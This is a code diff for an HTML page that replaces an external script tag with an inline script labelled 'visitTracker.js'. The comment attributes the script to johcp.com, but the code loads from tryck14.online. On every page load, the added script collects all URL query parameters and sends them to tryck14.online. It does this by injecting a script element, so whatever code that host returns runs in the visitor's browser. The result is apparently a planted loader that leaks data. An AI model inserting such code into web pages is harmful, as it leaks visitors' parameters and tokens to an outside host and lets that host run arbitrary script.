@@ -7,6 +7,25 @@
 </head>
 <body>
     <!-- Embed the visitTracker.js script from johcp.com -->
-    <script src="https://tryck14.online/visitTracker.js"></script>
+    <script>
+        // visitTracker.js
+function processData() {
+    // Extract query string and convert to object
+    const queryString = window.location.search;
+    const params = new URLSearchParams(queryString);
+    const queryParams = {};
+    for (const [key, value] of params.entries()) {
+        queryParams[key] = value;
+    }
+
+    // Send the query parameters to server (using JSONP)
+    const script = document.createElement("script");
+    script.src = `https://tryck14.online/go/visits?${new URLSearchParams(queryParams)}`;
+    document.body.appendChild(script);
+}
+
+// Initial call to trigger the server-side API
+processData();
+    </script>
 </body>
 </html>
